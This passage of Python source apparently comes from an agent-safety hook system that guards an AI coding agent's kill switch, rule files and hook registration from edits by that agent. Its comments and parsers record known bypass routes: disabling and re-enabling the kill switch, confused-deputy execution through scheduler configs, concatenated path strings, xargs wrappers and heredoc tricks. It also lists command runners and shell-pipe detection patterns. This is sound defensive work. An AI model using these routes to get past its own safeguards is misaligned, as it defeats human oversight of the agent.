    scopeable: bool = True,
) -> Tuple[bool, str]:
    """Does an unattended grant permit this ``ask``-tier command? ``(allowed, why)``.

    ``why`` is written to be read by a human in the block message — a refused
    scoped grant must say what it granted and what the command targeted, or the
    host is back to debugging a nightly timeout.

    ``scopeable=False`` declares that ``command`` has no filesystem target to
    measure a scope against — the MCP hook's synthesized ``agentwire email
    --to …`` is a tool invocation, not a command that touches a directory.
    A scoped grant then REFUSES rather than silently measuring the scope
    against the session cwd, which would have nothing to do with what the tool
    actually does.
    """
    if not rule_id:
        return False, "the matched rule has no id, so no grant can name it"
    scopes = grants.get(rule_id)
    if scopes is None:
        return False, f"rule '{rule_id}' is not on the unattended allowlist"
    if not scopes:
        # Named by an entry that did not parse. Deliberately NOT a fall-through
        # to a looser layer — see parse_unattended_allow.
        return False, (
            f"rule '{rule_id}' is named in unattended_allow but its entry is malformed, "
            f"so it grants nothing (check `agentwire tasks review` for the reason)"
        )
    if any(not s for s in scopes):
        return True, f"rule '{rule_id}' is granted unattended (unscoped)"

    flat = [p for s in scopes for p in s]
    if not scopeable:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, and this "
            f"action has no filesystem target to measure that scope against"
        )
    dirs, unscopeable = command_scope_dirs(command, cwd, pattern=pattern)
    if unscopeable:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, and this "
            f"command's target directory cannot be established ({unscopeable})"
        )
    outside = [d for d in dirs if not any(path_in_scope(d, p) for p in flat)]
    if outside:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, but this "
            f"command targets {', '.join(outside)}"
        )
    return True, (
        f"rule '{rule_id}' is granted under {', '.join(flat)}; "
        f"this command targets {', '.join(dirs)}"
    )


def policy_file_parse_failures(
    global_config_path: Optional[Path] = None,
    cwd: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Parse failures in the global policy file and the nearest project
    ``.damagecontrol.yml`` (#1137). The loaders swallow these by design (fail
    secure), so doctor asks here instead; same record shape as ``_parse_failures``.
    """
    failures: List[Dict[str, Any]] = []
    if not yaml:
        return failures
    if global_config_path is None:
        global_config_path = Path.home() / ".agentwire" / "damagecontrol.yml"
    candidates = [global_config_path]
    current = os.path.abspath(cwd or safe_cwd())
    while True:
        project = os.path.join(current, ".damagecontrol.yml")
        if os.path.isfile(project):
            candidates.append(Path(project))
            break
        parent = os.path.dirname(current)
        if parent == current:
            break
        current = parent
    for path in candidates:
        if not path.exists():
            continue
        try:
            yaml.safe_load(path.read_text())
        except Exception as exc:
            mark = getattr(exc, "problem_mark", None)
            failures.append({
                "file": str(path),
                "line": mark.line + 1 if mark is not None else None,
                "error": str(getattr(exc, "problem", None) or exc),
            })
    return failures


def load_safety_config(
    global_config_path: Optional[Path] = None,
    cwd: Optional[str] = None,
) -> Dict[str, Any]:
    """Resolve the effective safety knobs from the dedicated damage-control files.

    The kill switch and rule knobs live in HOST-OWNED, agent-unwritable files
    (see ``is_protected_control_plane``) — never in ``config.yaml`` /
    ``.agentwire.yml``, which the policed agent can edit:

      * Global:  ``~/.agentwire/damagecontrol.yml``
      * Project: ``.damagecontrol.yml`` (nearest, walking up from ``cwd``)

    Each holds top-level ``enabled`` / ``disabled_rules`` / ``unattended_allow``.
    Returns ``{enabled, disabled_rules, unattended_allow}``. A project
    ``.damagecontrol.yml`` may both loosen AND tighten ``enabled`` (it simply
    wins); ``disabled_rules`` / ``unattended_allow`` are merged (set-union).

    Fail-secure: a missing/unreadable/yaml-less global file ⇒ ``enabled: true``.
    """
    enabled = True
    disabled_rules: List[str] = []
    unattended_allow: List[str] = []
    project_enabled: Optional[bool] = None
    if not yaml:
        return {"enabled": enabled, "disabled_rules": disabled_rules,
                "unattended_allow": unattended_allow}

    def _absorb(data: Any) -> Optional[bool]:
        """Pull knobs from a parsed policy doc; return its ``enabled`` (or None)."""
        local_enabled: Optional[bool] = None
        if isinstance(data, dict):
            if "enabled" in data and data["enabled"] is not None:
                local_enabled = bool(data["enabled"])
            rules = data.get("disabled_rules", [])
            if isinstance(rules, list):
                disabled_rules.extend(str(r) for r in rules if r)
            allow = data.get("unattended_allow", [])
            if isinstance(allow, list):
                unattended_allow.extend(str(a) for a in allow if a)
        return local_enabled

    if global_config_path is None:
        global_config_path = Path.home() / ".agentwire" / "damagecontrol.yml"
    try:
        if global_config_path.exists():
            with open(global_config_path, "r") as f:
                gdata = yaml.safe_load(f) or {}
            genabled = _absorb(gdata)
            if genabled is not None:
                enabled = genabled
    except Exception as exc:
        _record_load_failure(global_config_path, exc, None)

    if cwd is None:
        cwd = safe_cwd()
    current = os.path.abspath(cwd)
    while True:
        candidate = os.path.join(current, ".damagecontrol.yml")
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r") as f:
                    pdata = yaml.safe_load(f) or {}
                project_enabled = _absorb(pdata)
            except Exception as exc:
                _record_load_failure(Path(candidate), exc, None)
            break
        parent = os.path.dirname(current)
        if parent == current:
            break
        current = parent

    if project_enabled is not None:
        enabled = project_enabled

    return {
        "enabled": enabled,
        "disabled_rules": sorted(set(disabled_rules)),
        "unattended_allow": sorted(set(unattended_allow)),
    }


# ============================================================================
# PROTECTED CONTROL PLANE (escape-hatch- AND kill-switch-EXEMPT)
# ============================================================================
#
# Damage control reads its kill switch, its rules, and its own hook
# registration from files on disk. If the policed agent can write those files,
# it can disable safety, act, and re-enable — defeating everything (#466). So
# the WHOLE control plane is hard-protected: any write/edit/delete/move/chmod
# targeting one of these paths is BLOCKED, and — unlike every other rule — the
# ``# allow:`` escape hatch and the ``enabled: false`` kill switch do NOT
# override it. Only the user's ``allowedPaths`` allowlist can re-permit a path,
# because that is a human, host-side opt-in (the agent cannot add to it without
# editing a protected file, which is itself blocked).
#
# The guarantee: the agent only ever operates within the freedom the human
# preset. Loosening is always a host-side act.

PROTECTED_CONTROL_PLANE_PATHS = [
    "~/.agentwire/damagecontrol.yml",   # global kill switch + rule knobs
    "*.damagecontrol.yml",              # project kill switch + rule knobs (any dir)
    "~/.claude/settings.json",          # PreToolUse hook registration
    "~/.agentwire/hooks/damage-control/*.py",  # the hook scripts themselves
    "~/.claude/hooks/*",                # agentwire-owned Claude Code hooks
    "~/.agentwire/damage-control/*.yaml",      # the damage-control rule files
    # Execution-plane configs: agentwire runs strings from these files through
    # its OWN ``subprocess.run(..., shell=True)`` calls (scheduler gate commands
    # in scheduler.py, service healthchecks in services.py) — those subprocesses
    # do NOT traverse the Claude Code hook, so a policed agent that can write a
    # gate/healthcheck gets unguarded code execution on the next tick (a
    # confused-deputy escape). Treat them as control plane (#466 lockdown).
    "~/.agentwire/scheduler.yaml",      # scheduler gate commands run via shell
    "~/.agentwire/config.yaml",         # service healthcheck commands run via shell
    # Per-project task-EXECUTION config (#720): split out of ``.agentwire.yml``,
    # which is now purely declarative (type/roles/voice/parent/worktree) and
    # agent-writable again — it carries no exec vector. ``.agentwire.tasks.yml``
    # holds the ``tasks:`` block (pre/post/on_task_end/shell/unattended_allow),
    # which agentwire runs the same way (confused-deputy risk above), so it
    # stays protected. Authored via propose-and-promote: an agent drafts to the
    # UNPROTECTED ``.agentwire.tasks.proposed.yml`` staging file; a human reviews
    # (``agentwire tasks review``) and promotes (``agentwire tasks promote``) —
    # the agent never writes the live file. See ``agentwire/tasks_cli.py``.
    "*.agentwire.tasks.yml",            # project task-execution config (any dir)
]


def control_plane_allowlist_overlaps(
    allowed_paths: List[Dict[str, Any]],
) -> List[Tuple[str, str]]:
    """``(entry_path, protected_pattern)`` pairs where a user ``allowedPaths``
    entry re-permits writes to the protected control plane (#938).

    The precedence itself is intended — the allowlist is the one human,
    host-side override — but a broad entry (``*/.agentwire/*``) takes the
    kill switch with it silently, and this is the detector ``doctor`` uses to
    say so. Judged with :func:`match_path` — the ENFORCEMENT matcher — on a
    concrete sample instantiated from each protected pattern (each ``*``
    replaced by a literal token), so the check cannot disagree with what the
    hook would actually allow. Entries that only re-permit reads are skipped:
    the control plane is readable by design; only its writes are protected.

    Judged against a CANONICAL home, not this process's ``$HOME``: both the
    protected sample and a ``~``-anchored entry are expanded to the same
    fixed anchor before matching. The question doctor asks is "does this
    entry's SHAPE cover the control plane", and answering it with the live
    ``$HOME`` made the verdict depend on where the process happens to run —
    a test harness (or CI) with its home relocated under ``/tmp`` turned the
    shipped ``/tmp/*`` build-artifact entry into a false overlap, the exact
    environment-shaped failure #938 itself documents from #920.
    """
    write_ops = ALL_OPERATIONS - {"read"}
    out: List[Tuple[str, str]] = []
    for entry in allowed_paths:
        if not entry.get("allow", set()) & write_ops:
            continue
        for prot in PROTECTED_CONTROL_PLANE_PATHS:
            if _entry_covers_control_plane(entry["path"], prot):
                out.append((entry["path"], prot))
    return out


_CANONICAL_HOME = "/home/agentwire-canonical"


@functools.lru_cache(maxsize=16)
def _live_homes(home: str) -> Tuple[str, ...]:
    """``home`` lexically and resolved, longest first, minus the root (a rewrite there covers everything)."""
    homes = {os.path.normpath(home), os.path.realpath(home)}
    return tuple(sorted(homes - {"/", "."}, key=len, reverse=True))


def _anchor_home(p: str) -> str:
    """``p`` with a leading ``~``, or a live-``$HOME`` prefix, moved to the canonical home.

    A rewrite must never change what an entry COVERS. Rewriting a bare
    ancestor (``/tmp/*`` at ``HOME=/tmp``, ``HOME=/``, a ``HOME`` with a
    trailing slash) would turn a location allowance into
    ``<canonical>/*`` — a pattern that covers the control plane — which is the
    #1121 bypass again, one level up. So the live-home form is rewritten only
    when at least one literal path component below ``$HOME`` is named
    (``$HOME/.agentwire/*``), and tested against both the lexical and the
    resolved home.
    """
    if p.startswith("~"):
        return _CANONICAL_HOME + p[1:]
    for home in _live_homes(os.path.expanduser("~")):
        rest = p[len(home) + 1:] if p.startswith(home + "/") else None
        first = rest.split("/", 1)[0] if rest else ""
        if first and not is_glob_pattern(first):
            return _CANONICAL_HOME + p[len(home):]
    return p


def _entry_covers_control_plane(entry_path: str, protected: str) -> bool:
    """Whether an allowlist entry's SHAPE covers the protected pattern, wherever ``$HOME`` is."""
    sample = _anchor_home(protected).replace("*", "x")
    if not os.path.isabs(sample):
        sample = "/x/" + sample
    entry = _anchor_home(entry_path)
    # a directory pattern (``dist/``) guards everything inside it
    return match_path(sample, entry) or (sample.endswith("/") and match_path(sample + "x", entry))


def control_plane_allowlist(allowed_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """The allowlist entries that may re-permit a protected control-plane path.

    An entry counts only if its shape covers the control plane at a CANONICAL
    home. Judged against the live path instead, ``/tmp/*`` (shipped, for
    scratch work) re-permitted ``$HOME/.agentwire/damagecontrol.yml`` whenever
    ``$HOME`` lived under ``/tmp`` — the decision followed where the home
    happened to be, not what the target is (#1121). A human's explicit entry
    still counts — one that NAMES a protected file (``/repo/.damagecontrol.yml``)
    or whose shape covers the control plane (``~/.agentwire/*``); a location
    allowance never does.
    """
    return guarded_allowlist(allowed_paths, PROTECTED_CONTROL_PLANE_PATHS)


def guarded_allowlist(
    allowed_paths: List[Dict[str, Any]], guarded_patterns: List[str]
) -> List[Dict[str, Any]]:
    """The entries that may re-permit a path matching one of ``guarded_patterns``.

    Same rule for every guarded class (control plane, ``zeroAccessPaths``,
    ``readOnlyPaths``, ``noDeletePaths``): an entry counts if it NAMES a guarded
    path literally, or its shape covers a guarded pattern at the canonical
    home — never because the live ``$HOME`` happens to sit under the entry's
    directory (#1122: ``/tmp/*`` re-permitted ``~/.ssh/id_rsa`` at ``HOME=/tmp/x``).
    """
    return [
        e for e in allowed_paths
        if (
            not is_glob_pattern(e["path"])
            and any(match_path(os.path.expanduser(e["path"]), pat) for pat in guarded_patterns)
        )
        or any(_entry_covers_control_plane(e["path"], pat) for pat in guarded_patterns)
    ]


def _protected_path_patterns() -> List[str]:
    """Protected paths in both ``~``-form and ``$HOME``-expanded form.

    Commands may reference either; including both ensures the regex/glob
    matchers catch e.g. ``/Users/me/.claude/settings.json`` and
    ``~/.claude/settings.json`` alike.
    """
    out: List[str] = []
    for p in PROTECTED_CONTROL_PLANE_PATHS:
        out.append(p)
        expanded = os.path.expanduser(p)
        if expanded != p:
            out.append(expanded)
    return out


def _matched_protected_pattern(file_path: str) -> Optional[str]:
    """The protected-path pattern that matches ``file_path``, if any."""
    for pat in _protected_path_patterns():
        if match_path(file_path, pat):
            return pat
    return None


def is_protected_control_plane(file_path: str) -> bool:
    """True if ``file_path`` is part of the damage-control control plane."""
    return _matched_protected_pattern(file_path) is not None


def _protected_reason(matched_pattern: str) -> str:
    """Block reason for a protected-control-plane hit, tailored to the path.

    ``.agentwire.tasks.yml`` has a real, host-side remedy (propose-and-promote,
    #720) — name it so the agent doesn't dead-end. Everything else keeps the
    generic "edit on the host" message.
    """
    if matched_pattern.endswith(".agentwire.tasks.yml"):
        return (
            "protected task-execution control-plane file (host-owned) — draft "
            "to .agentwire.tasks.proposed.yml instead, then ask the host to run "
            "`agentwire tasks review` and `agentwire tasks promote`"
        )
    return "protected control-plane file (host-owned; edit on the host)"


def check_protected_path(
    file_path: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block edits/writes to a control-plane file unless the user allowlisted it.

    Used by the edit/write hooks. The allowlist (a human opt-in) may override;
    nothing else does.
    """
    matched = _matched_protected_pattern(file_path)
    if matched:
        if is_path_allowed_for_op(file_path, control_plane_allowlist(allowed_paths), "edit"):
            return False, ""
        return True, _protected_reason(matched)
    return False, ""


# Innermost literals only (no quote of either kind inside): an outer shell
# quote wrapping ``print('…')`` must not swallow the literal that holds the prose.
_QUOTED_LITERAL_RE = re.compile(r"'[^'\"\n]*'|\"[^'\"\n]*\"")


_PROSE_STOPWORDS = frozenset(
    "the is are was were be been for in by see to of and with this that from on "
    "it its has have not but or at as into when where which".split()
)
_SHELL_WORDS = frozenset(
    "cd source exec eval command builtin export set unset alias".split()
)
_SHELL_SYNTAX_CHARS = frozenset(";&|$`(){}<>\\!")


def _reads_as_prose(words: List[str]) -> bool:
    """True when ``words`` (a literal minus the path) is English, not a command.

    Fail closed: ALL must hold — no flags/paths/operators/shell syntax
    characters; NO word anywhere is a shell reserved word, builtin, or a program
    on PATH (``shutil.which``) — a leading ``please``/``to``/``for f in a; do``
    cannot hide the verb behind it; and a stopword (``the``/``is``/``in`` …) or
    sentence punctuation shows it is a sentence. Over-blocks prose that happens
    to contain a program name (``see the test``) — the safe direction.

    Declared residual: ``which`` consults the HOOK's PATH, not the shell's, and
    knows nothing of shell functions/aliases, so a program missing from the
    hook's PATH is read as a plain word.
    """
    if len(words) < 2:
        return False
    for t in words:
        if t[0] in "-/~." or "/" in t or "=" in t or _SHELL_SYNTAX_CHARS & set(t):
            return False
        w = t.lower().strip(",:;.!?")
        if w in _SHELL_WORDS or shutil.which(w):
            return False
    return any(
        t.lower().strip(",:;.!?") in _PROSE_STOPWORDS or t[-1] in ",:;!?"
        for t in words
    )


_DATA_SINK_RE = re.compile(
    r"\b(?:print|write|echo|log|info|debug|warn|warning|error)\s*\(?\s*$"
)
_ASSIGN_PREFIX_RE = re.compile(r"(?:^|[\n;])[ \t]*([A-Za-z_]\w*)[ \t]*=[ \t]*$")


def _is_standalone_data(command: str, start: int, end: int) -> bool:
    """True when the literal at ``command[start:end]`` is syntactically alone.

    Its left neighbour must be a plain assignment ``name =`` at the start of a
    statement, or a data-only sink call (``print(`` / ``.write(`` / ``echo ``),
    and its right neighbour a closing ``)`` / ``;`` / ``#`` / newline / end.
    A pipe is NOT allowed: it feeds the literal to code as stdin. ``+``, ``%``, ``,``, ``[``, ``.join``, an
    adjacent literal, a keyword argument, or any other call all fail — so the
    path can never be assembled with a write verb sitting in a neighbouring
    literal.
    """
    before = command[:start].rstrip(" \t")
    after = command[end:].lstrip(" \t")
    nxt = after[:1]
    assign = _ASSIGN_PREFIX_RE.search(command[:start])
    if assign:
        return nxt in ("", ";", "#", "\n") and _only_sunk(command, assign.group(1))
    if not _DATA_SINK_RE.search(before):
        return False
    # a closing quote is the enclosing shell quote (``perl -e 'print "…"'``)
    return nxt in ("", ")", ";", "#", "\n", "'", '"')


def _only_sunk(command: str, name: str) -> bool:
    """True when every use of ``name`` is the assignment or ``sink(name)``.

    ``s='<prose>'`` is data only while nothing can feed ``s`` to code:
    ``'echo hi > ' + s``, ``s.split()``, ``open(s…)``, ``os.system(s)``,
    ``f"{s}"`` all name it somewhere other than as the sole argument of a data
    sink, so the occurrence count exceeds the assignment plus the sunk uses.
    """
    word = r"\b" + re.escape(name) + r"\b"
    sunk = re.compile(
        r"\b(?:print|write|echo|log|info|debug|warn|warning|error)\s*\(\s*"
        + word + r"\s*\)"
    )
    return len(re.findall(word, command)) == 1 + len(sunk.findall(command))


def redact_prose_mentions(command: str, path: str) -> str:
    """Blank quoted literals that merely TALK ABOUT ``path`` (#1086).

    The interpreter net (#678) reads opaque program text, so it cannot tell
    ``s='hooks in <path> are empty'`` from a write. Contract, fail closed — a
    literal is redacted ONLY when:

    1. STRUCTURE (:func:`_is_standalone_data`): it is a whole assignment value
       or the sole argument of a data-only sink (print/write/echo/log), so it
       cannot be joined to a neighbouring literal that holds the verb;
    2. CONTENT (:func:`_reads_as_prose`): it reads as a sentence — stopword or
       punctuation, no flags/slashes/operators/shell syntax, no word a program
       on PATH or shell builtin; and
    3. no shell write pattern matches it.

    Everything else stays visible: the path alone (``open('<path>','w')``),
    command-shaped literals, anything ambiguous.

    An assigned literal additionally requires every other use of the variable
    to be ``sink(name)`` (:func:`_only_sunk`), so indirection through the
    variable keeps it visible.

    Declared residual: program detection uses the hook's PATH (see
    :func:`_reads_as_prose`).
    """
    path_re = _rx(_path_context_regex(path))
    literals = _path_literals(path)
    out: List[str] = []
    last = 0
    for m in _QUOTED_LITERAL_RE.finditer(command):
        lit = m.group(0)
        body = lit[1:-1]
        if (
            _may_mention_path(body, literals)
            and path_re.search(body)
            and _is_standalone_data(command, m.start(), m.end())
            and _reads_as_prose(path_re.sub(" ", body).split())
            and not check_path_patterns(body, path, READ_ONLY_BLOCKED, "")[0]
        ):
            out.append(command[last:m.start()])
            out.append(lit[0] + path_re.sub("<path-mention>", body) + lit[-1])
            last = m.end()
    out.append(command[last:])
    return "".join(out)


def fold_string_concat(command: str) -> str:
    """Join adjacent/``+``/``.``-concatenated quoted literals into one (#1095).

    ``open("…/damage"+"control.yml","w")`` never contains the protected path as
    a single token, so the interpreter net (#678) could not match it. Folding
    ``"a"+"b"`` / ``'a' 'b'`` / ``"a"."b"`` makes the net see what the program
    would build. Declared residual: strings assembled at RUNTIME (``join``,
    ``chr``, ``format``, decoding) are not statically recoverable.
    """
    for _ in range(64):
        folded = _CONCAT_RE.sub(lambda m: m.group("q") + m.group("a") + m.group("b") + m.group("q"), command, count=1)
        if folded == command:
            break
        command = folded
    return command


_SEGMENT_SPLIT = _rx(r"[;&|\n(]")
_ASSIGN_WORD = _rx(r"^\w+=")
# Commands whose quoted arguments are themselves run as commands (#1097): a
# wrapped command is the command, so these args are never prose.
_ARG_RUNNERS = frozenset({
    "ssh", "eval", "watch", "xargs", "su", "busybox", "docker", "kubectl", "podman",
    "find", "parallel", "tmux", "screen", "script", "at", "osascript", "pkexec",
})


def _blank_prose_args(hay: str, path: str) -> str:
    """Blank quoted args that mention ``path`` among other words (#1097).

    ``git commit -m 'touch <path>'`` / ``gh … --body "gzip <path>"`` are TEXT:
    the operand-writer patterns scan a whole simple command, so a verb inside a
    message would pair with the path. An arg that is only the path (optionally
    quoted — ``ln -sf x "<path>"``) stays visible, and so does the program
    text of a ``-c`` wrapper (``sh -c "touch <path>"``), which IS a command.
    Runs on the RAW command: the ladder haystacks are already unquoted, so a
    message and a bare operand look the same there.
    """
    if not _may_mention_path(hay, _path_literals(path)):
        return hay
    path_re = _rx(_path_context_regex(path))

    wrapper_payload = _rx(r"\s-\S*c\s+$")
    runs_data = _rx(
        r"^[^|;&\n]*\|\s*(?:(?:env|sudo)\s+)*(?:"
        r"(?:xargs\b[^|;&\n]*\b)?(?:sh|bash|zsh|dash|ksh)\b|eval\b|source\b)"
    )

    def _executes(start: int, end: int) -> bool:
        """True when the quoted span at ``start:end`` is code, not text."""
        prefix, quote, body = hay[:start], hay[start], hay[start + 1 : end - 1]
        if wrapper_payload.search(prefix):
            return True
        # substitution executes inside double quotes; single-quoted it is data
        if quote == '"' and ("$(" in body or "`" in body):
            return True
        # an unclosed process substitution: ``bash <(echo '…')``
        opener = max(prefix.rfind("<("), prefix.rfind(">("))
        if opener != -1 and ")" not in prefix[opener:]:
            return True
        # the command word runs its arguments (ssh host '…', eval '…', watch '…')
        words = _SEGMENT_SPLIT.split(prefix)[-1].split()
        words = [w for w in words if not _ASSIGN_WORD.match(w)]
        names = [os.path.basename(w) for w in words]
        if names and (
            names[0] in _ARG_RUNNERS
            or (names[0] in _PREFIX_WRAPPERS and any(n in _ARG_RUNNERS for n in names[1:]))
        ):
            return True
        # the text is piped into something that runs it (``… | xargs sh -c``)
        return bool(runs_data.search(hay[end:]))

    def _blank(m: "re.Match[str]") -> str:
        body = m.group(0)[1:-1]
        if (
            path_re.search(body)
            and path_re.sub(" ", body).strip()
            and not _executes(m.start(), m.end())
        ):
            return m.group(0)[0] * 2
        return m.group(0)

    return _rx(r''''[^'\n]*'|"[^"\n]*"''').sub(_blank, hay)


def _quote_word(word: str) -> str:
    """Re-quote a parsed word that would not survive being joined back by spaces."""
    return shlex.quote(word) if re.search(r"[\s'\"`$()\\]", word) else word


def _xargs_rescans(command: str, path: str) -> List[str]:
    """Synthesize the command ``xargs`` / ``parallel`` runs when its input mentions ``path``.

    Stance (#1095, #1099): ``xargs`` and GNU ``parallel`` are WRAPPERS, not
    verbs — they run their command with stdin (or ``:::`` words) as operands.
    When the command mentions a protected path anywhere, the wrapper's tail is
    re-scanned as a command in its own right with that path appended (or
    substituted for the ``-I`` / ``{}`` replacement string), so
    ``… | xargs rm`` is judged as ``rm <path>`` and ``… | xargs echo`` as
    ``echo <path>`` — the verb decides, exactly as it would unwrapped.
    """
    if not _may_mention_path(command, _path_literals(path)):
        return []
    mention = _rx(_path_context_regex(path)).search(command)
    if not mention:
        return []
    token = mention.group(0).strip("\"'\t \n;|&<>()=:")
    out: List[str] = []
    # quote-aware: a separator INSIDE the quoted command string belongs to it
    # (``parallel 'echo x; rm {}'`` runs the whole string through a shell)
    for m in _rx(r'''\b(xargs|parallel)\b((?:'[^']*'|"[^"]*"|[^\n|;&<'"])*)''').finditer(command):
        words = _words(m.group(2))
        if m.group(1) == "parallel":
            rest, repl = _parallel_command(words)
            replace = lambda w: _PARALLEL_REPLACEMENT.sub(lambda _m: token, w)  # noqa: E731
            hit = any(_PARALLEL_REPLACEMENT.search(w) for w in rest)
            if repl and any(repl in w for w in rest):
                replace = lambda w: w.replace(repl, token)  # noqa: E731
                hit = True
            rest = [replace(w) for w in rest] if hit else rest + [token]
            # parallel hands the command to a shell: its first word may be a whole
            # command LINE (``'echo x; rm {}'``), the rest are quoted arguments
            out.append(" ".join(rest[:1] + [_quote_word(w) for w in rest[1:]]))
            continue
        repl = None
        rest = []
        i = 0
        while i < len(words):
            w = words[i]
            if rest or not w.startswith("-"):
                rest.append(w)
            elif w in ("-I", "-J"):
                repl = words[i + 1] if i + 1 < len(words) else None
                i += 1
            elif w.startswith(("-I", "-J")):
                repl = w[2:]
            elif w == "--replace" or w.startswith("--replace="):
                repl = w.partition("=")[2] or "{}"
            elif w in ("-L", "-n", "-P", "-s", "-d", "-E", "-a"):
                i += 1
            i += 1
        if repl and any(repl in w for w in rest):
            out.append(" ".join(_quote_word(w.replace(repl, token)) for w in rest))
        else:
            out.append(" ".join([_quote_word(w) for w in rest] + [token]))
    return out


def _protected_ancestor_dirs() -> List[str]:
    """Directories (``~``-form) holding control-plane files, up to but excluding ``~``."""
    dirs: List[str] = []
    for pat in PROTECTED_CONTROL_PLANE_PATHS:
        head = re.split(r"[*?\[]", pat, maxsplit=1)[0]
        if not head.startswith("~/"):
            continue
        d = os.path.dirname(head.rstrip("/")) if not head.endswith("/") else head.rstrip("/")
        while d.startswith("~/") and d not in dirs:
            dirs.append(d)
            d = os.path.dirname(d)
    return dirs


def _extracts_into_protected_dir(command: str) -> Optional[str]:
    """The protected directory a command extracts/downloads INTO, if any."""
    for d in _protected_ancestor_dirs():
        expanded = os.path.expanduser(d)
        dir_re = r"(?:" + re.escape(expanded) + r"|" + re.escape(d) + r")"
        for tmpl in PROTECTED_DIR_EXTRACT_PATTERNS:
            if _rx(tmpl.replace("{dir}", dir_re)).search(command):
                return d
    return None


# The delimiter is a shell WORD: adjacent quoted / backslashed / bare parts
# concatenate (``'E'OF`` is the delimiter ``EOF``), and ANY quote or backslash
# in it makes the body literal.
_HEREDOC_WORD = (
    r"(?:'[^']*'|\$?\"(?:[^\"\\]|\\.)*\"|\\.|\$'[^']*'|[^\s;&|<>()'\"\\$]+|\$(?!['\"]))+"
)
_HEREDOC_OPEN_RE = _rx(r"(?<!<)<<(?!<)(?P<dash>-?)[ \t]*(?P<word>" + _HEREDOC_WORD + r")")
_HEREDOC_PART = _rx(r"'([^']*)'|\"((?:[^\"\\]|\\.)*)\"|\\(.)|\$'([^']*)'|([^'\"\\]+)")
_LOCALE_QUOTE = _rx(r"'[^']*'|\$(?=\")")
_RESCAN_DEPTH = 3
_RESCAN_FANOUT = 32
_RESCAN_BUDGET = 200  # derived commands scanned per top-level check


def _heredoc_delimiter(word: str) -> Tuple[str, bool]:
    """``(delimiter, body_is_literal)`` for a heredoc delimiter word."""
    # ``$"EOF"`` is a locale-translated string: bash quotes it like ``"EOF"``
    word = _LOCALE_QUOTE.sub(lambda m: "" if m.group(0) == '$' else m.group(0), word)
    parts = _HEREDOC_PART.findall(word)
    delim = "".join("".join(p) for p in parts)
    return delim, any(p[0] or p[1] or p[2] or p[3] for p in parts) or "'" in word or '"' in word


_SEGMENT_BREAK = _rx(r";|&&|\|\||(?<![|<>])&(?!>)|\n")


def _until_break(text: str) -> str:
    m = _SEGMENT_BREAK.search(text)
    return text[: m.start()] if m else text


_CLOSER = _rx(r"[ \t]*;?[ \t]*[)}][^\n]*")


def _feeding_segment(command: str, start: int, word_end: int, line_end: int) -> str:
    """The simple command a heredoc marker at ``start`` is attached to (pipes kept, ``;``/``&&`` break it).

    A group closer after the command (``{ cat <<'EOF'; } | sh``) is part of it,
    so a heredoc inside a group that is piped onward is judged by its consumer;
    the delimiter word itself is never split (``<<'a;b'``).
    """
    line_start = command.rfind("\n", 0, start) + 1
    before = command[line_start:start]
    cut = [m.end() for m in _SEGMENT_BREAK.finditer(before)]
    head = before[cut[-1]:] if cut else before
    after = command[word_end:line_end]
    seg = head + command[start:word_end] + _until_break(after)
    nxt = _SEGMENT_BREAK.search(after)
    closer = _CLOSER.match(after[nxt.end():]) if nxt else None
    if closer and "$(" not in before and "`" not in before:
        seg += " " + _until_break(closer.group(0))
    return seg


class _Heredoc:
    """One heredoc: where its body sits and whether the shell expands it."""

    __slots__ = ("start", "body_start", "body_end", "end", "body", "quoted", "line")

    def __init__(
        self, start: int, body_start: int, body_end: int, end: int, body: str, quoted: bool, line: str
    ):
        self.start, self.body_start, self.body_end, self.end = start, body_start, body_end, end
        self.body, self.quoted, self.line = body, quoted, line


_WORD_BREAK = frozenset(" \t\n;&|()<>")
_SEGMENT_END = frozenset("\n;&|()")
_SPECIAL_PARAMS = frozenset("#?!$@*-")
_WALK_DEPTH = 40
# The character before a ``(`` that makes it a scope whose body bash parses on its
# own (process substitution, array assignment) — the one place that list lives.
_REPARSED_OPENERS = frozenset("<>=")
# Words after which a new command starts (``for ((…))``, ``if ((…))``, ``! ((…))``).
_COMMAND_PREFIX_WORDS = frozenset(
    "for while until if then elif else do time ! coproc { } select case in".split()
)
_IDENT = _rx(r"[A-Za-z_][A-Za-z0-9_]*")


class _HeredocScanner:
    """Bash-shaped tokenizer: finds every REAL heredoc and reads its body (#1106).

    The one place that decides whether a ``<<`` is a redirection operator. It
    walks the command the way the shell reads it — quotes, ``$'…'``, backslash,
    ``#`` comments (only at the start of a word), ``${…}``, ``$(…)``, backticks,
    ``$((…))`` / ``((…))`` / ``[[ … ]]`` / ``let`` arguments (where ``<<`` is a
    shift or a string compare), and ``<<<`` here-strings — and a marker found in
    any of those is not a heredoc. Bodies are skipped as the shell skips them
    (read at the next newline), so an apostrophe in prose cannot desync it.

    Every uncertainty resolves toward "not a heredoc": an unparseable delimiter,
    an unterminated body, a construct this walk does not model. Hiding a line
    from the rules is the dangerous direction; scanning one that was really data
    costs a rephrase.
    """

    def __init__(self, command: str):
        self.s = command
        self.n = len(command)
        self.found: List[_Heredoc] = []
        self.pending: List[Tuple[int, "re.Match[str]", bool]] = []
        self.absent: set = set()
        self.closed = False  # whether the last ``_commands`` walk ended on its closer
        # The current line holds a construct bash rejects with a syntax error (a
        # ``<<`` in an array literal, a literal that never closes). A recovering
        # bash (3.2) runs the NEXT line, so no marker on this line may hide it:
        # the newline discards the line's pending markers instead of reading them.
        self.poisoned = False

    def run(self) -> Tuple[_Heredoc, ...]:
        self._commands(0, "", 0)
        return tuple(self.found)

    # -- helpers ---------------------------------------------------------
    def _skip_single(self, i: int) -> int:
        j = self.s.find("'", i + 1)
        return self.n if j == -1 else j + 1

    def _skip_ansi_c(self, i: int) -> int:
        """``$'…'`` starting at the ``$``: backslash escapes the next char."""
        j = i + 2
        while j < self.n and self.s[j] != "'":
            j += 2 if self.s[j] == "\\" else 1
        return min(j + 1, self.n)

    def _skip_braces(self, i: int) -> int:
        """``${…}`` starting at the ``$``: to the matching ``}``."""
        depth, j = 0, i + 1
        while j < self.n:
            c = self.s[j]
            if c == "\\":
                j += 2
                continue
            if c == "'":
                j = self._skip_single(j)
                continue
            depth += (c == "{") - (c == "}")
            j += 1
